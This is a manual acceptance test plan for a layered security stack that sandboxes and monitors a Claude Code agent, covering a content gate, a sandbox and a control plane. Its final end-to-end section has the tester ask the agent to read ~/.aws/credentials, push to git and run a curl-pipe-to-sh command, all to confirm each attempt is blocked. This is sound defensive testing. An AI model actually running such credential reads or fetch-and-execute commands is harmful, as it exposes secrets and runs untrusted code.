# Endpoint Stack — Hands-On Test Plan

A manual acceptance checklist to run **before merging `claude/endpoint-setup-bzrf3j` into
`main`**. The unit suite (`pytest`) already passes; this guide exercises the moving parts by
hand, the way an operator actually deploys the stack.

Tests are grouped by what you need installed:

- **Part A — Core** (no cplt / Prempti / Ollama): proves all wiring. ~10 min. **Do these first.**
- **Part B — With Ollama**: the data-plane gate end to end.
- **Part C — With cplt**: the execution plane.
- **Part D — With Prempti**: the control plane.
- **Part E — Full end-to-end**: agent launched inside the sandbox (the real test).

Each test states **what it proves**, the **commands** to paste, and the **expected result**.
Tick the box when it matches. If anything differs, stop and note it on the PR.

> Conventions: run from the repo root. Activate the venv once:
> ```bash
> python -m venv .venv && source .venv/bin/activate && pip install -e .[dev]
> ```
> After that, `spektralia` is on your PATH for the whole session.

---

## Part A — Core wiring (no external tools)

### A1 — Clean install + full test suite
**Proves:** the branch builds and every automated test passes on your machine.
```bash
pytest -q
```
- [ ] Ends with `393 passed, 1 xfailed` (the 1 xfailed is the macOS-only syscall; expected).

### A2 — New commands exist and are no-ops by default
**Proves:** `check-prempti` and the SessionStart wiring are inert until you opt in, so the
change is non-breaking for existing installs.
```bash
spektralia check-sandbox
spektralia check-prempti
```
- [ ] `check-sandbox` prints `OK: no sandbox configured` (exit 0).
- [ ] `check-prempti` prints `OK: no control plane configured` (exit 0).

### A3 — Fail-closed when a backend is enabled but its tool is missing
**Proves:** once you turn a plane on, a missing wrapper **blocks** rather than silently passing.
(cplt / premptictl are not installed yet, so this should fail — that is the point.)
```bash
SPEKTRALIA_SANDBOX_BACKEND=cplt   spektralia check-sandbox ; echo "exit=$?"
SPEKTRALIA_PREMPTI_BACKEND=prempti spektralia check-prempti ; echo "exit=$?"
```
- [ ] First prints `FAIL: cplt not on PATH` with `exit=1`.
- [ ] Second prints `FAIL: premptictl not on PATH` with `exit=1`.

### A4 — `install-hooks` writes settings and self-verifies
**Proves:** one command wires the five Claude Code hooks and confirms them with `hook-check`.
Use a throwaway directory so your real config is untouched.
```bash
mkdir -p /tmp/spk-hooktest && cd /tmp/spk-hooktest
spektralia install-hooks
echo "exit=$?"
cat .claude/settings.json | head -20
cd - >/dev/null
```
- [ ] Prints `OK: wrote Spektralia hooks to /tmp/spk-hooktest/.claude/settings.json`.
- [ ] Then prints `OK: all required hooks present (...)` and `exit=0`.
- [ ] The JSON references your real repo path (not `/path/to/spektralia`).

### A5 — `install-hooks` preserves existing config (merge safety)
**Proves:** install **merges**, never clobbers — your other settings and hooks survive.
```bash
mkdir -p /tmp/spk-merge/.claude && cd /tmp/spk-merge
printf '{"model":"my-model","hooks":{"Notification":[{"hooks":[{"type":"command","command":"x"}]}]}}' \
  > .claude/settings.json
spektralia install-hooks >/dev/null
python -c "import json;d=json.load(open('.claude/settings.json'));print('model:',d['model']);print('events:',sorted(d['hooks']))"
cd - >/dev/null
```
- [ ] `model: my-model` is still there.
- [ ] `events:` lists `Notification` **and** the five Spektralia events
      (`PostToolUse, PreToolUse, SessionStart, Stop, UserPromptSubmit`).

### A6 — File permissions on the written settings
**Proves:** the hooks file is written `0600` (owner-only), matching the rest of the stack.
```bash
stat -c '%a' /tmp/spk-hooktest/.claude/settings.json   # Linux
# macOS: stat -f '%A' /tmp/spk-hooktest/.claude/settings.json
```
- [ ] Prints `600`.

### A7 — SessionStart hook runs the new checks but does NOT block at defaults
**Proves:** the SessionStart preflight calls `check-sandbox` + `check-prempti`, and with
default (`none`) backends they pass, so a normal session is not blocked by this change.
```bash
echo '{"session_id":"t"}' | python integrations/claude_code_hooks/session_start.py \
  | python -c "import sys,json;d=json.load(sys.stdin);print('action:',d.get('action'));print((d.get('reason') or '(no reason)'))"
```
- [ ] `check-sandbox` and `check-prempti` do **not** appear in any failure reason.
      (You may see `hook-check` / `verify-installed` failures here — those are environmental
      in a bare checkout, not caused by this change. `action: continue` if your env is clean.)

### A8 — Config precedence: env overrides, and backends stay out of the cache key
**Proves:** the new settings load via env/TOML like every other setting, and selecting a
backend does not change the content-scan config hash (it must not invalidate the cache).
```bash
python - <<'PY'
from spektralia.config import Settings
base = Settings()
flip = Settings(sandbox_backend="cplt", prempti_backend="prempti", prempti_socket="/run/p.sock")
print("hash unchanged:", base.config_hash() == flip.config_hash())
import os
os.environ["SPEKTRALIA_PREMPTI_BACKEND"]="prempti"
print("env applied:", Settings.from_env().prempti_backend == "prempti")
PY
```
- [ ] Both lines print `True`.

### A9 — Launcher script is well-formed and fails closed without cplt
**Proves:** `run-claude-sandboxed.sh` parses and refuses to launch when its preflights or cplt
are absent (it should never drop you into an unsandboxed agent).
```bash
bash -n scripts/run-claude-sandboxed.sh && echo "syntax OK"
./scripts/run-claude-sandboxed.sh --help 2>&1 | head -5 ; echo "exit=$?"
```
- [ ] `syntax OK` prints.
- [ ] The launcher stops at a preflight (`check-ollama`/`check-sandbox`) or `cplt not on PATH`
      with a non-zero exit — it does **not** reach "launching Claude Code".

### A10 — Config files are valid
**Proves:** the committed `.cplt.toml` and the bundle samples parse.
```bash
python -c "import tomllib;[tomllib.load(open(f,'rb')) for f in ['.cplt.toml','endpoint/spektralia.endpoint.toml','endpoint/cplt-global-config.toml']];print('TOML OK')"
```
- [ ] Prints `TOML OK`.

---

## Part B — Data plane (requires Ollama)

Install Ollama and pull the model first:
```bash
ollama pull llama3.1:8b      # default model
ollama serve &               # if not already running
```

### B1 — `check-ollama` reaches the classifier
```bash
spektralia check-ollama
```
- [ ] Prints `OK: Ollama <version>` (exit 0).

### B2 — Gate BLOCKS a credential (rule layer)
**Proves:** a hard rule hit blocks regardless of the classifier.
```bash
echo 'my card 4111111111111111' | spektralia scan ; echo "exit=$?"
```
- [ ] Prints `Blocked: rule(CREDIT_CARD)` with `exit=2`.

### B3 — Gate BLOCKS an email
```bash
echo 'email me at alice@example.com' | spektralia scan ; echo "exit=$?"
```
- [ ] Prints `Blocked: rule(EMAIL)` with `exit=2`.

### B4 — Gate PASSES benign text and sanitizes
**Proves:** clean text flows through once the classifier is reachable.
```bash
echo 'the quick brown fox jumps over the lazy dog' | spektralia scan ; echo "exit=$?"
```
- [ ] The sentence is echoed back (sanitized stdout) with `exit=0`.

### B5 — Fail-closed when Ollama is down (the key safety property)
**Proves:** classifier outage blocks, not passes.
```bash
# stop ollama (Ctrl-C the `ollama serve`, or:)
pkill -f 'ollama serve' ; sleep 1
echo 'the quick brown fox' | spektralia scan ; echo "exit=$?"
echo 'the quick brown fox' | SPEKTRALIA_FAIL_OPEN=1 spektralia scan ; echo "exit=$?"
```
- [ ] First: `Blocked: classifier_unavailable`, `exit=2` (fail-closed).
- [ ] Second: text echoed, `exit=0` (explicit opt-out works). Restart `ollama serve` after.

---

## Part C — Execution plane (requires cplt)

Install cplt (https://github.com/navikt/cplt) so `cplt` is on PATH, then:
```bash
cp endpoint/cplt-global-config.toml ~/.config/cplt/config.toml
cplt trust accept --all        # approve this repo's [propose] block in .cplt.toml
```

### C1 — `check-sandbox` detects cplt and hashes the policy
```bash
SPEKTRALIA_SANDBOX_BACKEND=cplt spektralia check-sandbox
```
- [ ] Prints `OK: cplt present, config <12-hex>` (exit 0). Note the hash for C2.

### C2 — Optional config-hash pin (high-assurance)
**Proves:** pinning detects drift; editing `.cplt.toml` after pinning blocks the session.
```bash
HASH=$(SPEKTRALIA_SANDBOX_BACKEND=cplt spektralia check-sandbox | grep -o '[0-9a-f]\{12\}')
SPEKTRALIA_SANDBOX_BACKEND=cplt SPEKTRALIA_SANDBOX_CONFIG_HASH=$HASH spektralia check-sandbox ; echo "match exit=$?"
SPEKTRALIA_SANDBOX_BACKEND=cplt SPEKTRALIA_SANDBOX_CONFIG_HASH=deadbeef spektralia check-sandbox ; echo "drift exit=$?"
```
- [ ] Matching pin: `OK: cplt present ...`, `match exit=0`.
- [ ] Wrong pin: `FAIL: cplt config hash drift ...`, `drift exit=1`.

### C3 — Ollama stays reachable inside cplt's allowlist
**Proves:** the global config's `localhost = [11434]` actually lets the classifier through.
```bash
cplt -- spektralia check-ollama
```
- [ ] Prints `OK: Ollama <version>`. (If it fails, the allowlist is wrong — investigate before merge.)

### C4 — `~/.spektralia` is writable inside the sandbox (audit chain survives)
**Proves:** the advisor-fixed allowlist holds — the audit log can be written from inside cplt.
```bash
cplt -- spektralia stats           # touches ~/.spektralia
ls -l ~/.spektralia/
```
- [ ] `stats` runs without a permission error; files exist under `~/.spektralia/`.

---

## Part D — Control plane (requires Prempti)

Install Prempti (Falco) so `premptictl` is on PATH and the service is running, then:
```bash
mkdir -p ~/.prempti && cp endpoint/prempti/spektralia.rules.yaml ~/.prempti/rules.yaml
```

### D1 — `check-prempti` detects the service
```bash
SPEKTRALIA_PREMPTI_BACKEND=prempti spektralia check-prempti
```
- [ ] Prints `OK: prempti present, ...` (exit 0).

### D2 — Socket liveness check
**Proves:** a configured-but-dead socket fails closed.
```bash
SPEKTRALIA_PREMPTI_BACKEND=prempti SPEKTRALIA_PREMPTI_SOCKET=/tmp/does-not-exist.sock \
  spektralia check-prempti ; echo "exit=$?"
```
- [ ] Prints `FAIL: prempti socket not found ...` with `exit=1`.

---

## Part E — Full end-to-end (the real acceptance test)

Activate the whole stack, then launch Claude Code inside it and try to do bad things.

```bash
# Merge the activated config (or export the env vars):
export SPEKTRALIA_SANDBOX_BACKEND=cplt
export SPEKTRALIA_PREMPTI_BACKEND=prempti
export SPEKTRALIA_PREMPTI_SOCKET=~/.prempti/prempti.sock
spektralia install-hooks          # wire the data-plane hooks into this project
```

### E1 — All four preflights pass together
```bash
spektralia check-ollama && spektralia check-sandbox && spektralia check-prempti && spektralia hook-check
```
- [ ] All four print `OK: ...`. This is exactly what SessionStart enforces.

### E2 — Launch the agent inside the sandbox
```bash
./scripts/run-claude-sandboxed.sh
```
- [ ] You see the preflight lines, then "launching Claude Code inside cplt", and Claude Code starts.

### E3 — Inside the running agent, attempt each threat and confirm it is caught
Ask the agent (or have it try) the following, one at a time. Each should be **blocked**, and
you should be able to point at *which plane* caught it:

| Try this | Should be blocked by | What you should see |
|----------|---------------------|---------------------|
| Paste a live-looking key in your prompt, e.g. `sk_live_0123456789abcdef0123` | **Spektralia** (UserPromptSubmit) | prompt is blocked/sanitized before it reaches the model |
| Have the agent run `cat ~/.aws/credentials` | **Prempti** (intent) + **cplt** (read deny) | tool call denied |
| Have the agent run `git push` | **Prempti** rule / **cplt** git guard | push intent blocked |
| Have the agent run `curl http://example.com/x \| sh` | **cplt** (network namespace) | the child `sh` cannot reach the network |

- [ ] Key-in-prompt blocked at the data plane.
- [ ] Credential read denied.
- [ ] `git push` denied.
- [ ] `curl … | sh` cannot exfiltrate (network denied).

### E4 — Audit trail was written and verifies
**Proves:** the visibility plane recorded the session and the hash-chain is intact.
```bash
ls -l ~/.spektralia/
spektralia audit-verify ~/.spektralia/audit.jsonl    # adjust filename if different
```
- [ ] An audit log exists and `audit-verify` reports `OK: <n> records, chain intact`.

---

## Sign-off

- [ ] Part A complete (core wiring) — **required before merge**.
- [ ] Part B complete (data plane) — if Ollama available.
- [ ] Part C complete (execution plane) — if cplt available.
- [ ] Part D complete (control plane) — if Prempti available.
- [ ] Part E complete (end-to-end) — the full stack on a real endpoint.

If only Part A is feasible in your environment, that still validates everything this branch
*changes*; Parts B–E validate the external tools the branch *integrates with* but does not vendor.
Record which parts you ran on the PR before merging.
```bash
# cleanup of throwaway dirs
rm -rf /tmp/spk-hooktest /tmp/spk-merge
```
